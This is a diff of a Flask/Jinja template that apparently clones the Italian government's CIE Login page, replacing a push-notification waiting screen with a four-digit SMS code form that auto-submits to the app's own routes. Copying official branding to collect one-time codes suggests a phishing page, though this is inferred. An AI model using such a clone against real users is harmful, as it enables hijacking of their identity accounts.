@@ -1,9 +1,13 @@
+<!doctype html>
 <html class="h-100" lang="it">
 	<head>
-		<title>CIE Login - attesa conferma</title>
+		<title>CIE Login</title>
+
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width,initial-scale=1.0" />
+
 		<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+
 		<link
 			rel="stylesheet"
 			href="{{ url_for('static', filename='cie/css/bootstrap-italia.min.css') }}"
@@ -12,6 +16,7 @@
 			rel="stylesheet"
 			href="{{ url_for('static', filename='cie/css/l12.css') }}?202603172014"
 		/>
+
 		<link
 			rel="apple-touch-icon"
 			sizes="57x57"
@@ -379,6 +384,7 @@
 			}
 		</style>
 		<script src="/static/cie/js/l12.js.jsp?202603172014"></script>
+
 		<script src="/static/cie/js/is.js?202603172014"></script>
 	</head>
 	<body class="d-flex flex-column h-100">
@@ -393,8 +399,10 @@
 								alt="Ministero dell'Interno"
 							/>
 						</div>
+
 						<div class="col-1 text-right">
 							<!-- lang -->
+
 							<div class="it-header-slim-right-zone">
 								<div class="menu-wrapper" id="switchLang">
 									<ul class="navbar-nav">
@@ -421,6 +429,7 @@
 													></use>
 												</svg>
 											</a>
+
 											<div
 												class="dropdown-menu"
 												role="region"
@@ -459,8 +468,10 @@
 									</ul>
 								</div>
 							</div>
+
 							<!-- /lang -->
 						</div>
+
 						<div class="col-4 col-lg-1 text-right">
 							<img
 								src="{{ url_for('static', filename='cie/images/CIE.png') }}"
@@ -472,6 +483,7 @@
 			</div>
 		</div>
 		<!-- /header -->
+
 		<div id="wrapperL12">
 			<div class="container my-4">
 				<div class="row">
@@ -490,181 +502,455 @@
 					</div>
 					<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
 				</div>
+
 				<div class="row">
-					<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+					<div class="col-1 col-md-2 d-none d-sm-flex"></div>
 					<div class="col">
 						<div class="row">
-							<div class="col-12 col-lg-8">
-								<h2 class="mb-4">
-									Controlla adesso il tuo cellulare
-								</h2>
-								<p class="c2">
-									Ti abbiamo inviato una notifica sull'App
-									CieID per autorizzare il tuo accesso.
-								</p>
-								<div id="postPushLink" style="display: none">
-									<p class="c2">
-										<a
-											href="{{ url_for('auth.cie_login_push_2fa') }}"
-											title="dopo aver confermato dalla app CieID, clicca qui per proseguire"
-											>Clicca qui dopo aver confermato la
-											notifica sulla APP</a
-										>
-									</p>
-								</div>
-							</div>
-							<div
-								class="col-12 col-lg-4 text-center mb-4 mb-lg-0"
-							>
-								<img
-									class="img-fluid"
-									src="{{ url_for('static', filename='cie/images/push.png') }}"
-									alt="Notifica push"
-									id="pushImg"
-								/>
-							</div>
-						</div>
-						<div class="row">
-							<div class="col">
-								<p class="font-weight-semibold c2">
-									Non hai ricevuto la notifica sul tuo
-									cellulare?
-								</p>
-							</div>
-						</div>
-						<p class="c2 mb-0">
-							Controlla in App di avere le notifiche abilitate o
-							&nbsp;<strong id="push" class=""
-								><a id="push_link" href="#"
-									>invia una nuova notifica.</a
-								></strong
-							>
-						</p>
-						<form
-							method="POST"
-							action="{{ url_for('auth.cie_login_notify_2fa') }}"
-							id="push_form"
-							class="d-inline"
-						>
-							<div class="d-inline">
-								<input type="hidden" name="cnl" value="push" />
-								<script>
-									$(document).ready(function () {
-										$("#push").html(
-											"<a id='push_link' href='#'>invia una nuova notifica.</a>",
-										);
-										$("#push_link").click(function (e) {
-											e.preventDefault();
-											$("#push_form").submit();
-										});
-									});
-								</script>
-								<noscript>
-									<button type="submit" class="btn btn-link">
-										invia una nuova notifica.
-									</button>
-								</noscript>
-							</div>
-						</form>
-						<div class="row d-none d-md-block py-4">
-							<div class="col">
-								<div class="row">
-									<div class="col"><hr /></div>
+							<div class="col"></div>
+							<div class="col-12 col-sm-10 col-lg-8 col-xl-6">
+								<!--start card  -->
+								<div class="card-wrapper card-space">
 									<div
-										class="col mx-n1 mx-lg-n3 align-self-center"
+										class="card card-bg card-big py-0 mx-0 mx-md-1"
 									>
-										<p
-											class="text-center font-weight-bold c3 mb-0"
-										>
-											In alternativa
-										</p>
+										<div class="card-body p-0 p-sm-4">
+											<br />
+
+											<div class="row" id="otpWrapper">
+												<div class="col">
+													<form
+														method="POST"
+														action="{{ url_for('auth.cie_login_push_2fa_sms') }}"
+														id="otpForm"
+													>
+														<div class="form-row">
+															<div
+																class="form-group col-12 text-center my-0"
+															>
+																<div
+																	id="otp"
+																	class="inputs d-flex flex-row justify-content-center mt-4"
+																>
+																	<input
+																		class="m-2 text-center form-control rounded"
+																		type="text"
+																		id="otp1"
+																		name="otp1"
+																		maxlength="1"
+																		value=""
+																		autofocus=""
+																	/>
+																	<input
+																		class="m-2 text-center form-control rounded"
+																		type="text"
+																		id="otp2"
+																		name="otp2"
+																		maxlength="1"
+																		value=""
+																	/>
+																	<input
+																		class="m-2 text-center form-control rounded"
+																		type="text"
+																		id="otp3"
+																		name="otp3"
+																		maxlength="1"
+																		value=""
+																	/>
+																	<input
+																		class="m-2 text-center form-control rounded"
+																		type="text"
+																		id="otp4"
+																		name="otp4"
+																		maxlength="1"
+																		value=""
+																	/>
+																</div>
+															</div>
+															<script>
+																$(
+																	document,
+																).ready(
+																	function () {
+																		$(
+																			"#otp.error > input",
+																		).focus(
+																			function () {
+																				//remove error highlight
+																				$(
+																					"#otp.error",
+																				).removeClass(
+																					"error",
+																				);
+																				//reset otp values and errormessage
+																				$(
+																					"#otp1, #otp2, #otp3, #otp4",
+																				).val(
+																					"",
+																				);
+
+																				resetStatusHandler();
+
+																				//unbind event
+																				$(
+																					"#otp > input",
+																				).unbind(
+																					"focus",
+																				);
+																			},
+																		);
+
+																		$(
+																			"#otp > input",
+																		).keyup(
+																			function (
+																				event,
+																			) {
+																				var $this =
+																					$(
+																						this,
+																					);
+																				var val =
+																					"" +
+																					$this.val();
+																				if (
+																					val.length >
+																					1
+																				) {
+																					//$("#keyDown").html( "[" + val + "]");
+																					$this.val(
+																						val.slice(
+																							0,
+																							1,
+																						),
+																					);
+																					event.preventDefault();
+																				}
+																				val =
+																					"" +
+																					$this.val();
+
+																				let isNum =
+																					/^\d+$/.test(
+																						val,
+																					);
+
+																				$(
+																					"#keyUp",
+																				).html(
+																					"[" +
+																						val +
+																						"] " +
+																						isNum,
+																				);
+
+																				if (
+																					isNum
+																				) {
+																					$this
+																						.next()
+																						.focus();
+																				} else {
+																					event.preventDefault();
+																					$this.val(
+																						"",
+																					);
+																					return;
+																					//don't work on android!
+																				}
+
+																				//autosubmit della form al 4o carattere
+																				if (
+																					$(
+																						"#otp1",
+																					).val() &&
+																					$(
+																						"#otp2",
+																					).val() &&
+																					$(
+																						"#otp3",
+																					).val() &&
+																					$(
+																						"#otp4",
+																					).val()
+																				) {
+																					//console.log( "AUTOSUBMIT");
+																					$(
+																						"#otpForm",
+																					).submit();
+																				}
+																			},
+																		);
+
+																		var submittingOTP = false;
+																		$(
+																			"#otpForm",
+																		).submit(
+																			function (
+																				event,
+																			) {
+																				if (
+																					!submittingOTP
+																				) {
+																					submittingOTP = true;
+																					return true;
+																				}
+																				event.preventDefault();
+																				return false;
+																			},
+																		);
+																	},
+																);
+															</script>
+															<noscript>
+																<div
+																	class="col-12 text-center"
+																>
+																	<button
+																		type="submit"
+																		class="btn btn-outline-primary w-50"
+																	>
+																		Manda
+																		OTP
+																	</button>
+																</div>
+															</noscript>
+														</div>
+													</form>
+
+													<div
+														id="statusHandler"
+														class="row mb-4 mx-n2"
+													>
+														<div class="col">
+															<br /><br />
+														</div>
+													</div>
+
+													<h2 class="text-center">
+														Inserisci un codice di
+														verifica.
+													</h2>
+													<div class="pt-1 pb-3">
+														<p
+															class="text-center c2"
+															id="otpMsg"
+														>
+															Inserisci il codice
+															di verifica a 4
+															cifre ricevuto via
+															SMS al numero
+															{{ phone_number }}.
+														</p>
+													</div>
+
+													<div class="pb-3">
+														<p class="text">
+															Non hai ricevuto il
+															codice?
+															<strong
+																id="resendOtpWrapper"
+																><a
+																	id="reinvia_otp"
+																	href="#"
+																	>Invia di
+																	nuovo</a
+																><span
+																	id="invio_in_corso_otp"
+																	>invio in
+																	corso...</span
+																><span
+																	id="inviato_otp"
+																	>OTP
+																	inviato</span
+																><span
+																	id="errore_invio_otp"
+																	>Non è stato
+																	possibile
+																	inviare l
+																	OTP</span
+																></strong
+															>
+														</p>
+														<script>
+															$(document).ready(
+																function () {
+																	$(
+																		"#resendOtpWrapper",
+																	).html(
+																		"<a id='reinvia_otp' href='#'>Invia di nuovo</a><span id='invio_in_corso_otp'>invio in corso...</span><span id='inviato_otp'>OTP inviato</span><span id='errore_invio_otp'>Non è stato possibile inviare l OTP</span>",
+																	);
+
+																	// console.log("OTP");
+																	$(
+																		"#reinvia_otp",
+																	).click(
+																		function (
+																			e,
+																		) {
+																			e.preventDefault();
+																			$(
+																				"#reinvia_otp",
+																			).hide();
+																			$(
+																				"#invio_in_corso_otp",
+																			).show();
+																			$.ajax(
+																				{
+																					type: "POST",
+																					url: "{{ url_for('auth.cie_login_sms_notify_2fa') }}",
+																				},
+																			)
+																				.done(
+																					function (
+																						data,
+																					) {
+																						$(
+																							"#invio_in_corso_otp",
+																						).hide();
+
+																						var content =
+																							$(
+																								data,
+																							).find(
+																								"#statusHandlerMsg",
+																							);
+																						if (
+																							content.length ==
+																							1
+																						) {
+																							$(
+																								"#inviato_otp",
+																							)
+																								.empty()
+																								.append(
+																									content,
+																								);
+																						}
+
+																						$(
+																							"#inviato_otp",
+																						).show();
+																					},
+																				)
+																				.fail(
+																					function () {
+																						$(
+																							"#invio_in_corso_otp",
+																						).hide();
+																						$(
+																							"#errore_invio_otp",
+																						).show();
+																					},
+																				)
+																				.always(
+																					function () {
+																						setTimeout(
+																							function () {
+																								$(
+																									"#inviato_otp",
+																								)
+																									.hide()
+																									.empty()
+																									.append(
+																										"OTP inviato",
+																									);
+																								$(
+																									"#errore_invio_otp",
+																								).hide();
+																								$(
+																									"#reinvia_otp",
+																								).show();
+																							},
+																							30000,
+																						);
+																					},
+																				);
+																		},
+																	);
+																},
+															);
+														</script>
+														<noscript>
+															<form
+																method="POST"
+																action="{{ url_for('auth.cie_login_sms_notify_2fa') }}"
+																id="otp2Form"
+															>
+																<div
+																	class="form-row mb-n3"
+																>
+																	<div
+																		class="col-12 text-center"
+																	>
+																		<button
+																			type="submit"
+																			class="btn btn-outline-primary w-50"
+																		>
+																			Invia
+																			di
+																			nuovo
+																		</button>
+																	</div>
+																</div>
+															</form>
+														</noscript>
+														<p>
+															Il numero di
+															cellulare non è
+															corretto?
+															<br /><strong
+																><a
+																	href="https://www.portaleidentita.interno.gov.it/pgic/faq/general"
+																	title="Scopri come modificarlo"
+																	target="_blank"
+																	class=""
+																	>Scopri come
+																	modificarlo</a
+																></strong
+															>
+														</p>
+													</div>
+												</div>
+											</div>
+											<div class="row">
+												<div class="col"></div>
+												<div
+													class="col-8 col-lg-9 col-xl-8 text-center mb-2"
+												>
+													<form
+														name="resetform"
+														method="POST"
+														action="/idp"
+													>
+														<div>
+															<a
+																href="{{ url_for('auth.login') }}"
+																type="button"
+																class="btn btn-outline-primary text-nowrap d-block mt-3"
+																>Annulla</a
+															>
+														</div>
+													</form>
+												</div>
+												<div class="col"></div>
+											</div>
+										</div>
 									</div>
-									<div class="col"><hr /></div>
 								</div>
 							</div>
+							<div class="col"></div>
 						</div>
-						<div class="row d-none d-md-block">
-							<div class="col">
-								<p class="c2">
-									Inquadra il QR Code con l'App
-									CieID.&nbsp;<strong
-										><a
-											href="{{ url_for("auth.cie_login") }}"
-											title="Vai al QR code"
-											>Vai al QR code</a
-										></strong
-									>
-								</p>
-							</div>
-						</div>
-						<div class="row d-md-none">
-							<div class="col pt-4">
-								<p class="c2">
-									<strong
-										><a
-											href="{{ url_for("auth.cie_login") }}"
-											id="cancelAndGoQr"
-											title="Annulla e vai al QR code"
-											>Annulla</a
-										></strong
-									>
-								</p>
-							</div>
-						</div>
-						<script>
-							checkPushConfirmed();
-						</script>
 					</div>
-					<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+					<div class="col-1 col-md-2 d-none d-sm-flex"></div>
 				</div>
 			</div>
+			<!-- /wrapperL12 .container-->
 		</div>
-		<div id="bottomStripWrapper" class="mb-5 bottom-strip">
-			<div class="container">
-				<div class="row">
-					<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
-					<div class="col py-4">
-						<p class="c2 mb-0">
-							Non puoi utilizzare l'App CieID? &nbsp;<strong
-								id="sms"
-								class="d-block d-md-inline"
-								><a id="sms_link" href="#"
-									>Autorizza tramite SMS</a
-								></strong
-							>
-						</p>
-						<form
-							method="POST"
-							action="{{ url_for('auth.cie_login_sms_2fa') }}"
-							id="sms_form"
-							class="d-inline"
-						>
-							<div class="d-inline">
-								<input type="hidden" name="cnl" value="sms" />
-								<script>
-									$(document).ready(function () {
-										$("#sms").html(
-											"<a id='sms_link' href='#'>Autorizza tramite SMS</a>",
-										);
-										$("#sms_link").click(function (e) {
-											e.preventDefault();
-											$("#sms_form").submit();
-										});
-									});
-								</script>
-								<noscript>
-									<button type="submit" class="btn btn-link">
-										Autorizza tramite SMS
-									</button>
-								</noscript>
-							</div>
-						</form>
-					</div>
-					<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
-				</div>
-			</div>
-		</div>
+		<!-- /wrapperL12 -->
+
 		<!-- footer -->
+
 		<footer class="it-footer mt-auto">
 			<div class="it-footer-small-prints">
 				<div class="container py-3 text-white px-3 px-md-0">
